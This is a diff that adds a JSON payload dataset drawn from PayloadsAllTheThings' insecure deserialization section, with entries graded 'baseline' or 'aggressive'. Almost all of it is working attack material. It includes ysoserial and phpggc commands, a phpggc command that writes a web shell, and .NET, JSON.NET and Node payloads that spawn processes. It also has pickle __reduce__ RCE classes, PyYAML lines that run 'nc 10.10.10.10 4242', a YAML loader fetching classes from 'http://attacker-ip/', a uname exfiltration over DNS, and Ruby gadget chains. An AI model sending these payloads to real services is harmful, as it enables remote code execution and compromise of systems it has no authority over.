@@ -1,0 +1,305 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "insecure_deserialization",
+  "original_category": "Insecure Deserialization",
+  "payloads": [
+    {
+      "category": "XmlSerializer",
+      "escalation": "baseline",
+      "lines": [
+        ".\\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c \"calc.exe\"",
+        "<?xml version=\"1.0\"?>",
+        "<root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">",
+        "<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >",
+        "<ExpandedElement/>",
+        "<ProjectedProperty0>",
+        "<MethodName>Parse</MethodName>",
+        "<MethodParameters>",
+        "<anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">",
+        "</anyType>",
+        "</MethodParameters>",
+        "<ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>",
+        "</ProjectedProperty0>",
+        "</ExpandedWrapperOfXamlReaderObjectDataProvider>",
+        "</root>"
+      ]
+    },
+    {
+      "category": "NetDataContractSerializer",
+      "escalation": "baseline",
+      "lines": [
+        ".\\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t"
+      ]
+    },
+    {
+      "category": "LosFormatter",
+      "escalation": "baseline",
+      "lines": [
+        ".\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t"
+      ]
+    },
+    {
+      "category": "JSON.NET",
+      "escalation": "baseline",
+      "lines": [
+        ".\\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc.exe\" -t",
+        "{",
+        "'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',",
+        "'MethodName':'Start',",
+        "'MethodParameters':{",
+        "'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',",
+        "'$values':['cmd', '/c calc.exe']",
+        "},",
+        "'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}",
+        "}"
+      ]
+    },
+    {
+      "category": "BinaryFormatter",
+      "escalation": "baseline",
+      "lines": [
+        "./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t"
+      ]
+    },
+    {
+      "category": "Ysoserial",
+      "escalation": "baseline",
+      "lines": [
+        "java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin",
+        "java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin",
+        "java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin",
+        "java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64"
+      ]
+    },
+    {
+      "category": "JSON Deserialization",
+      "escalation": "baseline",
+      "lines": [
+        "Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object"
+      ]
+    },
+    {
+      "category": "YAML Deserialization",
+      "escalation": "baseline",
+      "lines": [
+        "!!javax.script.ScriptEngineManager [",
+        "!!java.net.URLClassLoader [[",
+        "!!java.net.URL [\"http://attacker-ip/\"]",
+        "]]",
+        "]"
+      ]
+    },
+    {
+      "category": "Encryption",
+      "escalation": "baseline",
+      "lines": [
+        "<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>",
+        "<param-name>org.apache.myfaces.SECRET</param-name>",
+        "<param-name>org.apache.myfaces.MAC_SECRET</param-name>"
+      ]
+    },
+    {
+      "category": "funcster",
+      "escalation": "baseline",
+      "lines": [
+        "{\"rce\":{\"__js_function\":\"function(){CMD=\\\"cmd /c calc\\\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()\"}}"
+      ]
+    },
+    {
+      "category": "General Concept",
+      "escalation": "baseline",
+      "lines": [
+        "<?php",
+        "class PHPObjectInjection{",
+        "public $inject;",
+        "function __construct(){",
+        "}",
+        "function __wakeup(){",
+        "if(isset($this->inject)){",
+        "eval($this->inject);",
+        "}",
+        "}",
+        "}",
+        "if(isset($_REQUEST['r'])){",
+        "$var1=unserialize($_REQUEST['r']);",
+        "if(is_array($var1)){",
+        "echo \"<br/>\".$var1[0].\" - \".$var1[1];",
+        "}",
+        "}",
+        "else{",
+        "echo \"\"; # nothing happens here",
+        "}",
+        "?>"
+      ]
+    },
+    {
+      "category": "Type Juggling",
+      "escalation": "aggressive",
+      "lines": [
+        "<?php",
+        "$data = unserialize($_COOKIE['auth']);",
+        "if ($data['username'] == $adminName && $data['password'] == $adminPassword) {",
+        "$admin = true;",
+        "} else {",
+        "$admin = false;",
+        "}",
+        "a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}"
+      ]
+    },
+    {
+      "category": "Object Injection",
+      "escalation": "aggressive",
+      "lines": [
+        "<?php",
+        "class ObjectExample",
+        "{",
+        "var $guess;",
+        "var $secretCode;",
+        "}",
+        "$obj = unserialize($_GET['input']);",
+        "if($obj) {",
+        "$obj->secretCode = rand(500000,999999);",
+        "if($obj->guess === $obj->secretCode) {",
+        "echo \"Win\";",
+        "}",
+        "}",
+        "?>",
+        "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}",
+        "a:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;}"
+      ]
+    },
+    {
+      "category": "Finding and Using Gadgets",
+      "escalation": "aggressive",
+      "lines": [
+        "phpggc monolog/rce1 'phpinfo();' -s",
+        "phpggc monolog/rce1 assert 'phpinfo()'",
+        "phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data",
+        "phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini"
+      ]
+    },
+    {
+      "category": "Pickle",
+      "escalation": "baseline",
+      "lines": [
+        "import cPickle",
+        "from base64 import b64encode, b64decode",
+        "class User:",
+        "def __init__(self):",
+        "self.username = \"anonymous\"",
+        "self.password = \"anonymous\"",
+        "self.rank     = \"guest\"",
+        "h = User()",
+        "auth_token = b64encode(cPickle.dumps(h))",
+        "print(\"Your Auth Token : {}\").format(auth_token)",
+        "new_token = raw_input(\"New Auth Token : \")",
+        "token = cPickle.loads(b64decode(new_token))",
+        "print \"Welcome {}\".format(token.username)",
+        "import cPickle, os",
+        "from base64 import b64encode, b64decode",
+        "class Evil(object):",
+        "def __reduce__(self):",
+        "return (os.system,(\"whoami\",))",
+        "e = Evil()",
+        "evil_token = b64encode(cPickle.dumps(e))",
+        "print(\"Your Evil Token : {}\").format(evil_token)",
+        "import pickle",
+        "import base64",
+        "class RCE:",
+        "def __reduce__(self):",
+        "return eval, (\"__import__('os').system('whoami')\",)",
+        "pickled = pickle.dumps(RCE())",
+        "print(base64.b64encode(pickled).decode())",
+        "__import__('os').system('whoami') # Reflected RCE",
+        "getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE",
+        "1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0) # Boolean-Based RCE",
+        "__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE"
+      ]
+    },
+    {
+      "category": "PyYAML",
+      "escalation": "baseline",
+      "lines": [
+        "!!python/object/apply:time.sleep [10]",
+        "!!python/object/apply:builtins.range [1, 10, 1]",
+        "!!python/object/apply:os.system [\"nc 10.10.10.10 4242\"]",
+        "!!python/object/apply:os.popen [\"nc 10.10.10.10 4242\"]",
+        "!!python/object/new:subprocess [[\"ls\",\"-ail\"]]",
+        "!!python/object/new:subprocess.check_output [[\"ls\",\"-ail\"]]",
+        "!!python/object/apply:subprocess.Popen",
+        "- ls",
+        "!!python/object/new:str",
+        "state: !!python/tuple",
+        "- 'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'",
+        "- !!python/object/new:Warning",
+        "state:",
+        "update: !!python/name:exec",
+        "with open('exploit_unsafeloader.yml') as file:",
+        "data = yaml.load(file,Loader=yaml.UnsafeLoader)"
+      ]
+    },
+    {
+      "category": "Marshal Deserialization",
+      "escalation": "baseline",
+      "lines": [
+        "for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done"
+      ]
+    },
+    {
+      "category": "YAML Deserialization",
+      "escalation": "baseline",
+      "lines": [
+        "require \"yaml\"",
+        "YAML.load(File.read(\"p.yml\"))",
+        "--- !ruby/object:Gem::Requirement",
+        "requirements:",
+        "!ruby/object:Gem::DependencyList",
+        "specs:",
+        "- !ruby/object:Gem::Source::SpecificFile",
+        "spec: &1 !ruby/object:Gem::StubSpecification",
+        "loaded_from: \"|id 1>&2\"",
+        "- !ruby/object:Gem::Source::SpecificFile",
+        "spec:",
+        "---",
+        "- !ruby/object:Gem::Installer",
+        "i: x",
+        "- !ruby/object:Gem::SpecFetcher",
+        "i: y",
+        "- !ruby/object:Gem::Requirement",
+        "requirements:",
+        "!ruby/object:Gem::Package::TarReader",
+        "io: &1 !ruby/object:Net::BufferedIO",
+        "io: &1 !ruby/object:Gem::Package::TarReader::Entry",
+        "read: 0",
+        "header: \"abc\"",
+        "debug_output: &1 !ruby/object:Net::WriteAdapter",
+        "socket: &1 !ruby/object:Gem::RequestSet",
+        "sets: !ruby/object:Net::WriteAdapter",
+        "socket: !ruby/module 'Kernel'",
+        "method_id: :system",
+        "git_set: id",
+        "method_id: :resolve",
+        "---",
+        "- !ruby/object:Gem::Installer",
+        "i: x",
+        "- !ruby/object:Gem::SpecFetcher",
+        "i: y",
+        "- !ruby/object:Gem::Requirement",
+        "requirements:",
+        "!ruby/object:Gem::Package::TarReader",
+        "io: &1 !ruby/object:Net::BufferedIO",
+        "io: &1 !ruby/object:Gem::Package::TarReader::Entry",
+        "read: 0",
+        "header: \"abc\"",
+        "debug_output: &1 !ruby/object:Net::WriteAdapter",
+        "socket: &1 !ruby/object:Gem::RequestSet",
+        "sets: !ruby/object:Net::WriteAdapter",
+        "socket: !ruby/module 'Kernel'",
+        "method_id: :system",
+        "git_set: sleep 600",
+        "method_id: :resolve"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.871Z"
+}
